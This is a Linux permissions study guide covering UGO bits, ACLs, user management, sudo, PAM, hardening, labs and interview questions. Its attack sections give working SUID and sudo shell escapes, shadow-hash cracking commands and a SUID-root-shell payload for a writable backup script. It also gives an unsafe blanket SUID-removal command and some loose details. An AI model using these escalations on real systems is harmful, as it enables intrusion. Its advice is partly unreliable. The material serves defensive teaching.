# Permissions and Users

## Layer Position

```
┌─────────────────────────────────────────────┐
│            User Applications                │
├─────────────────────────────────────────────┤
│          PAM Authentication Layer           │
├─────────────────────────────────────────────┤
│  ┌──────────┐ ┌────────┐ ┌───────────────┐ │
│  │   UGO    │ │  ACLs  │ │   sudo/su    │ │
│  │  Perms   │ │ Layer  │ │  Elevation   │ │
│  └────┬─────┘ └───┬────┘ └──────┬────────┘ │
│       └───────────┴─────────────┘           │
├─────────────────────┼───────────────────────┤
│         VFS Permission Check                │
├─────────────────────┼───────────────────────┤
│          Linux Kernel (DAC/MAC)             │
└─────────────────────┴───────────────────────┘
```

Linux permissions sit between user-space applications and the kernel's VFS layer, enforcing who can do what on every file, directory, and process.

---

## 1. Topic Overview

Linux permissions and user management form the discretionary access control (DAC) foundation of every Linux system. Every file, directory, and process has an owner, a group, and a set of permission bits that determine what operations are allowed.

Key concepts:
- **UGO model**: Owner, Group, Other — the three permission classes
- **rwx bits**: Read, Write, Execute — the three permission types
- **Special bits**: SUID, SGID, Sticky bit — extend basic permissions
- **ACLs**: Fine-grained per-user/per-group permissions beyond UGO
- **sudo/su**: Privilege elevation mechanisms
- **PAM**: Pluggable authentication framework

---

## 2. Why It Exists

Without permissions, any user could read, modify, or delete any file on the system. The permission model exists to:

1. **Enforce confidentiality** — prevent unauthorized reads of sensitive data
2. **Ensure integrity** — prevent unauthorized modifications
3. **Maintain availability** — prevent unauthorized deletions or resource exhaustion
4. **Support multi-user operation** — isolate users and their data
5. **Enable privilege delegation** — allow controlled elevation via sudo
6. **Comply with security standards** — required by CIS benchmarks, STIGs, PCI-DSS

---

## 3. Internal Architecture

### 3.1 Linux Permission Model

#### Owner/Group/Other (UGO)

Every file belongs to exactly one owner and one group:

```
┌──────────────┬──────────────┬──────────────┐
│    Owner     │    Group     │    Other     │
│   (user)     │              │  (everyone)  │
├──────────────┼──────────────┼──────────────┤
│  Read (r)    │  Read (r)    │  Read (r)    │
│  Write (w)   │  Write (w)   │  Write (w)   │
│  Execute (x) │  Execute (x) │  Execute (x) │
└──────────────┴──────────────┴──────────────┘
```

#### Read/Write/Execute (rwx)

| Permission | File Meaning | Directory Meaning |
|------------|--------------|-------------------|
| **r (4)** | View file contents | List directory contents |
| **w (2)** | Modify file contents | Create/delete files within |
| **x (1)** | Execute as program | Enter directory (cd) |

#### Numeric (Octal) Representation

```
r = 4 (binary 100)
w = 2 (binary 010)
x = 1 (binary 001)

Owner  Group  Other
 rwx    rwx    rwx
  7      7      7     →  chmod 777 file

 rwx    r-x    r-x
  7      5      5     →  chmod 755 file

 rw-    r--    r--
  6      4      4     →  chmod 644 file
```

#### Symbolic Representation

```
chmod u+x file      # Add execute for owner
chmod g-w file      # Remove write for group
chmod o=r file      # Set other to read-only
chmod a+r file      # Add read for all
chmod ug=rw file    # Set owner and group to read+write
```

---

### 3.2 Special Permission Bits

#### SUID (Set User ID) — runs as file owner

When set on an executable, the process runs with the **file owner's** privileges, not the executing user's.

```
Binary: /usr/bin/passwd    Owner: root    SUID: set
Result: Any user can modify /etc/shadow (owned by root, mode 640)
```

#### SGID (Set Group ID) — runs as file group

When set on an executable, the process runs with the **file group's** privileges. On directories, new files inherit the directory's group.

```
Binary: /usr/bin/newgrp    Owner: root    SGID: set
Result: Any user can assume the file's group identity
```

#### Sticky Bit — only owner can delete

When set on a directory, only the file owner (or root) can delete files within it — even if the directory is world-writable.

```
Directory: /tmp    Permissions: drwxrwxrwt
                                ^       ^
                                dir     sticky bit (t)
```

#### Permission Bits Diagram

```
  ┌─────────────────────────────────────────────────┐
  │            Permission Bit Layout                │
  ├──────┬──────┬──────┬──────┬──────┬──────┬───────┤
  │  -   │  r   │  w   │  x   │  r   │  w   │  x    │
  │ type │ owner│ owner│ owner│group │group │other  │
  └──────┴──────┴──────┴──────┴──────┴──────┴───────┘

  Special bits: [s/S] = SUID   [s/S] = SGID   [t/T] = Sticky

  -rwsr-xr-x  → SUID, owner rwx, group r-x, other r-x
  drwxrwxrwt  → directory, all rwx, sticky bit set
  drwxrwsr-x  → directory, all rwx, SGID set
```

---

### 3.3 Access Control Lists (ACLs)

ACLs extend the UGO model with per-user and per-group permission entries.

#### getfacl, setfacl

```bash
getfacl /etc/shadow                    # View ACL
setfacl -m u:bob:r /etc/shadow        # Give user bob read access
setfacl -x u:bob /etc/shadow          # Remove specific ACL entry
setfacl -b /etc/shadow                # Remove all ACLs
setfacl -R -m u:bob:rx /var/www/      # Recursive ACL on directory
```

#### ACL Entry Structure

```
user::rwx         # Owner permissions
user:bob:r-x      # Named user permissions
group::r-x        # Owning group permissions
group:devs:rw-    # Named group permissions
mask::r-x         # Effective permission mask
other::r--        # Other permissions
default:user::rwx # Default ACL for new files
```

#### Mask and Effective Permissions

The ACL mask defines the **maximum** permissions any named user/group can have. Effective permissions = entry AND mask.

```
ACL Entry:  user:bob:rwx
Mask:       mask::r-x
Effective:  user:bob:r-x    (rwx AND r-x = r-x)
```

---

### 3.4 User Management

#### /etc/passwd Field Breakdown

```
root:x:0:0:root:/root:/bin/bash
│ │ │ │ │    │     └── Default shell
│ │ │ │ │    └── Home directory
│ │ │ │ └── GECOS (full name/comment)
│ │ │ └── GID (primary group)
│ │ └── UID (0 = root, 1-999 = system)
│ └── Password hash (x = in /etc/shadow)
└── Username
```

#### /etc/shadow Structure

```
root:$6$rounds=656000$...:19000:0:99999:7:::
│      │                  │   │  │  │  │
│      │                  │   │  │  │  └─ Reserved
│      │                  │   │  │  └──── Warning period (days)
│      │                  │   │  └─────── Inactive period (days)
│      │                  │   └────────── Max age (days)
│      │                  └────────────── Last changed (days since epoch)
│      └───────────────────────────────── Password hash
└──────────────────────────────────────── Username
```

#### /etc/group Format

```
root:x:0:
devs:x:1001:alice,bob,charlie
│    │   │    └────────────── Group members
│    │   └──────────────────── GID
│    └──────────────────────── Group password placeholder
└───────────────────────────── Group name
```

#### useradd, usermod, userdel

```bash
# Create user with home directory and bash shell
useradd -m -s /bin/bash alice

# Create system user (UID < 1000, no home)
useradd -r -s /sbin/nologin svc_nginx

# Add to supplementary groups (-a = append, critical!)
usermod -aG sudo,docker alice

# Lock/unlock account
usermod -L alice    # Lock
usermod -U alice    # Unlock

# Set account expiry
usermod -e 2026-12-31 alice

# Delete user and home directory
userdel -r alice
```

#### groupadd, groupmod

```bash
groupadd -g 2000 devs
groupmod -n newdevs devs
gpasswd -a alice devs    # Add user to group
gpasswd -d alice devs    # Remove user from group
```

#### Password Policies

```bash
chage -l alice                    # View password aging info
chage -M 90 alice                # Force change every 90 days
chage -m 7 alice                 # Minimum days between changes
chage -W 14 alice                # Warning period before expiry
chage -E 2026-12-31 alice        # Set account expiry
chage -d 0 alice                 # Force change on next login
```

---

### 3.5 sudo and su

#### /etc/sudoers Format

```
# user  host=(runas)  commands
root    ALL=(ALL:ALL)   ALL
alice   ALL=(ALL)       /usr/bin/systemctl restart nginx
%devs   ALL=(ALL)       NOPASSWD: /usr/bin/docker
```

#### visudo

Always edit sudoers with `visudo` — it validates syntax before saving. A broken sudoers file can lock everyone out of root.

```bash
visudo                            # Edit with syntax checking
visudo -f /etc/sudoers.d/custom   # Edit alternate file
```

#### sudo Logging

```bash
# Sudo logs to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL)
grep sudo /var/log/auth.log | tail -20

# Enable detailed logging in sudoers
Defaults  logfile="/var/log/sudo.log"
Defaults  log_input, log_output
```

#### Principle of Least Privilege

```
/etc/sudoers
  └── #include /etc/sudoers.d/*
        ├── deploy    (deploy user)
        ├── monitoring (nagios user)
        └── backup    (backup user)

Best Practice: Use drop-in files, not /etc/sudoers directly.
Package upgrades may overwrite /etc/sudoers.
```

---

### 3.6 PAM (Pluggable Authentication Modules)

#### PAM Configuration

```
/etc/pam.d/              # Per-service PAM config
/etc/pam.d/sshd
/etc/pam.d/sudo

/lib/security/           # 32-bit modules
/lib64/security/         # 64-bit modules
```

#### Module Types

| Type | Purpose | Example |
|------|---------|---------|
| **auth** | Verify identity (password, biometric) | pam_unix.so, pam_ldap.so |
| **account** | Check if account is valid (expiry, access time) | pam_nologin.so, pam_time.so |
| **password** | Change password rules | pam_cracklib.so, pam_pwquality.so |
| **session** | Setup/cleanup on login/logout | pam_limits.so, pam_env.so |

#### Control Flags

| Flag | Behavior |
|------|----------|
| **required** | Must pass; if fails, continue checking but deny |
| **requisite** | Must pass; if fails, deny immediately |
| **sufficient** | If passes and no prior required failed, grant |
| **optional** | Ignore if not the only module of this type |

---

## 4. Common Attack Vectors

### 4.1 SUID Exploitation

```bash
# Step 1: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Step 2: Check GTFOBins (https://gtfobins.github.io)
# Example outputs:
#   -rwsr-xr-x 1 root root /usr/bin/find
#   -rwsr-xr-x 1 root root /usr/bin/vim
#   -rwsr-xr-x 1 root root /usr/bin/nmap

# Step 3: Exploit
find . -exec /bin/sh -p \; -quit     # find with SUID
vim -c ':!/bin/sh'                    # vim with SUID
nmap --interactive && !sh             # nmap (older versions)
```

### 4.2 Sudo Misconfiguration

```bash
# Dangerous sudoers entries
alice ALL=(ALL) NOPASSWD: ALL          # Full root, no password
alice ALL=(ALL) NOPASSWD: /usr/bin/vim  # Edit any file as root
alice ALL=(ALL) NOPASSWD: /usr/bin/find # Execute as root
alice ALL=(ALL) NOPASSWD: /usr/bin/bash # Instant root shell

# Find your sudo permissions
sudo -l

# Exploit examples
sudo vim -c ':!sh'
sudo find / -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
```

### 4.3 Password Attacks

```bash
# Shadow file cracking
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt

# Check for weak configurations
awk -F: '($2 == "" || $2 == "!" || $2 == "!!") {print $1}' /etc/shadow
awk -F: '$2 !~ /^x$/ {print $1 " has password in /etc/passwd"}' /etc/passwd
```

### 4.4 World-Writable Files

```bash
find / -perm -0002 -type f 2>/dev/null              # World-writable files
find / -perm -0002 -type d ! -path "/tmp*" 2>/dev/null  # WW directories (not /tmp)
find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null   # WW files in PATH
```

---

## 5. Security Hardening

### 5.1 Permission Audit Commands

```bash
find / -perm -4000 -type f 2>/dev/null         # List all SUID files
find / -perm -2000 -type f 2>/dev/null         # List all SGID files
getcap -r / 2>/dev/null                        # Files with capabilities
find / -nouser -o -nogroup 2>/dev/null         # Files with deleted owners
find / -name ".rhosts" 2>/dev/null             # rsh backdoor indicators
```

### 5.2 LinPEAS-Style Checks

```bash
# Users with UID 0 (should only be root)
awk -F: '$3 == 0' /etc/passwd

# Users with unusual shells
awk -F: '$7 != "/usr/sbin/nologin" && $7 != "/bin/false"' /etc/passwd

# Users without passwords
awk -F: '($2 == "" || $2 == "!" || $2 == "!!") {print $1}' /etc/shadow

# Writable sensitive files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab

# Empty password fields
grep -v '^!' /etc/shadow | grep -v '^\*' | awk -F: '($2 == "") {print "EMPTY: " $1}'
```

### 5.3 Secure Defaults

```bash
chmod 600 /etc/shadow
chmod 644 /etc/passwd
chmod 640 /etc/sudoers
chmod 700 /root
chmod o-w /etc /usr /var /home
find / -perm -4000 -type f -exec chmod u-s {} \; 2>/dev/null  # Remove SUID
echo "umask 027" >> /etc/profile
```

---

## 6. File System Permissions vs. ACLs

```
┌────────────────────────────────────────────────────────────┐
│              DAC Permission Check Flow                     │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Process requests access to file                           │
│           │                                                │
│           ▼                                                │
│  Is process UID = file owner?                              │
│    YES → Check owner permission bits                       │
│    NO  ▼                                                   │
│  Is process GID in file's group or supplementary groups?   │
│    YES → Check group permission bits                       │
│    NO  ▼                                                   │
│  Check "other" permission bits                             │
│           │                                                │
│           ▼                                                │
│  Are ACLs set? YES → Evaluate ACL entries + mask           │
│           │                                                │
│           ▼                                                │
│  ACCESS GRANTED or DENIED                                  │
└────────────────────────────────────────────────────────────┘
```

---

## 7. Real-World Scenarios

### Scenario 1: Web Server Compromise

```
Problem: Attacker gains shell on nginx (runs as www-data, UID 33)
  → Can read world-readable files, write to world-writable dirs

Mitigation:
  → Remove world-writable from web root
  → chown -R www-data:www-data /var/www
  → chmod 750 /var/www/html (not 755 or 777)
```

### Scenario 2: Backup Script Privilege Escalation

```
Problem: Backup script owned by root, writable by others
  -rwxrwxrwx 1 root root /opt/backup/backup.sh

  Attacker injects:
  #!/bin/bash
  cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash

  Next time root runs script → SUID root shell created

Mitigation:
  → chmod 700 /opt/backup/backup.sh
  → chown root:root /opt/backup/backup.sh
  → Audit scripts regularly
```

### Scenario 3: Sudo Nmap Escape

```
Problem: User has sudo nmap access
  $ sudo nmap --interactive
  nmap> !sh
  # whoami
  root

  (Older nmap — modern nmap removed --interactive)

Modern equivalent:
  $ sudo nmap --script <file.nse> --script-args="os.execute('/bin/sh')"
```

---

## 8. Interview Questions

### Fundamentals

1. **What is the difference between `chmod 755` and `chmod 777`?**
   - 755: owner rwx, group r-x, other r-x (secure default for executables)
   - 777: owner rwx, group rwx, other rwx (dangerous — world-writable)

2. **What does the sticky bit do on `/tmp`?**
   - Prevents users from deleting files owned by other users

3. **Why is `/etc/shadow` mode 640 instead of 644?**
   - Password hashes are sensitive; only root/shadow group should read them

4. **What's the difference between `useradd` and `adduser`?**
   - `useradd` is low-level (no home by default)
   - `adduser` is high-level wrapper (interactive, creates home)

5. **Explain `chmod u+s` vs `chmod g+s`.**
   - u+s sets SUID — process runs as file owner
   - g+s sets SGID — process runs as file group; on dirs, new files inherit group

### Intermediate

6. **What happens if `/etc/sudoers` has a syntax error?**
   - `visudo` prevents saving; manual edits could lock out all sudo access

7. **How would you find all SUID binaries on a system?**
   - `find / -perm -4000 -type f 2>/dev/null`

8. **What is the purpose of the ACL mask?**
   - Defines maximum permissions any named user/group can have

9. **Why use `usermod -aG` instead of `usermod -G`?**
   - `-G` without `-a` replaces all supplementary groups; `-aG` appends

10. **What PAM module type handles session setup?**
    - `session` type (e.g., pam_limits.so, pam_mkhomedir.so)

### Advanced

11. **How does SUID interact with capabilities?**
    - Capabilities grant fine-grained root privileges without full SUID. Example: `cap_setuid` allows UID switching.

12. **How does DAC differ from MAC (SELinux/AppArmor)?**
    - DAC: owner-based permissions (traditional Unix)
    - MAC: policy-based, enforced by kernel, restricts even root

13. **What's the security risk of NFS with `no_root_squash`?**
    - Remote root can create SUID files on NFS share, exploit on clients

14. **How would you detect a rogue SUID binary?**
    - Compare current SUID list against package manager baseline

15. **Explain the difference between `su -` and `su`.**
    - `su -` starts a login shell (loads user's environment)
    - `su` starts a non-login shell (inherits current environment)

---

## 9. Hands-On Labs

### Lab 1: Permission Enumeration

```bash
mkdir -p /tmp/lab && cd /tmp/lab
touch file1 file2 file3
mkdir dir1 dir2
chmod 755 dir1; chmod 700 dir2
chmod 644 file1; chmod 755 file2; chmod 666 file3

ls -la
getfacl file1

# Verify access
su - nobody -c "cat /tmp/lab/file1"    # Should work (other=r)
su - nobody -c "cd /tmp/lab/dir2"      # Should fail (other=---)
```

### Lab 2: SUID Discovery

```bash
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_list.txt

# Check which are from packages
while read f; do
  echo -n "$f: "
  dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || echo "UNPACKAGED"
done < /tmp/suid_list.txt
```

### Lab 3: ACL Configuration

```bash
mkdir /shared
groupadd project
chown root:project /shared
chmod 770 /shared

setfacl -m g:project:rwx /shared
setfacl -m d:g:project:rwx /shared    # Default for new files
setfacl -m u:alice:rwx /shared

getfacl /shared
```

### Lab 4: Sudo Configuration

```bash
useradd -m testuser
echo "testuser ALL=(ALL) /usr/bin/cat, /usr/bin/ls" > /etc/sudoers.d/testuser
chmod 440 /etc/sudoers.d/testuser

su - testuser
sudo -l                    # Shows limited commands
sudo cat /etc/passwd       # Should succeed
sudo cat /etc/shadow       # Should fail
```

### Lab 5: Password Policy Enforcement

```bash
cat /etc/login.defs | grep -E "^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_WARN_AGE"

sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS   90/' /etc/login.defs
sed -i 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS   7/' /etc/login.defs
sed -i 's/^PASS_WARN_AGE.*/PASS_WARN_AGE   14/' /etc/login.defs

chage -M 90 -m 7 -W 14 testuser
chage -l testuser
```

---

## 10. Quick Reference

### Common Commands

| Command | Purpose |
|---------|---------|
| `ls -la` | List files with permissions |
| `chmod 755 file` | Set numeric permissions |
| `chmod u+x file` | Add execute for owner |
| `chown user:group file` | Change ownership |
| `useradd -m user` | Create user with home |
| `userdel -r user` | Delete user and home |
| `usermod -aG group user` | Add to group (append) |
| `getfacl file` | View ACL |
| `setfacl -m u:user:rwx file` | Set ACL entry |
| `sudo -l` | List sudo permissions |
| `visudo` | Edit sudoers safely |
| `find / -perm -4000` | Find SUID binaries |
| `getcap -r /` | Find files with capabilities |
| `chage -l user` | View password aging |

### Permission Mnemonics

```
r = 4    Read
w = 2    Write
x = 1    Execute
s = SUID/SGID (replaces x in owner/group)
t = Sticky (replaces x in other)
S = SUID/SGID set but no execute
T = Sticky set but no execute

Common patterns:
  755 = rwxr-xr-x  (executable, secure)
  644 = rw-r--r--  (readable, not executable)
  700 = rwx------  (private to owner)
  600 = rw-------  (private, no execute)
  777 = rwxrwxrwx  (dangerous)
  4755 = rwsr-xr-x (SUID executable)
```

---

## 11. Common Mistakes

| Mistake | Risk | Fix |
|---------|------|-----|
| `chmod 777` on web root | Any user can modify web files | Use 755/644 |
| `usermod -G sudo alice` | Removes all other groups | Use `usermod -aG` |
| Editing `/etc/sudoers` with vim | Syntax error locks out root | Use `visudo` |
| World-writable `/etc` | Anyone can modify system config | `chmod o-w /etc` |
| SUID on custom scripts | Privilege escalation | `chmod u-s script` |
| No password policy | Accounts never expire | Set PASS_MAX_DAYS |
| Root SSH login enabled | Direct root access over network | `PermitRootLogin no` |

---

## 12. References

- **Linux man pages**: `man chmod`, `man chown`, `man sudoers`, `man pam`
- **GTFOBins**: https://gtfobins.github.io (SUID/sudo abuse)
- **CIS Benchmarks**: https://www.cisecurity.org/cis-benchmarks
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng
- **Linux Permission Tutorial**: https://linuxconfig.org/linux-permissions

---

*Last updated: 2026*
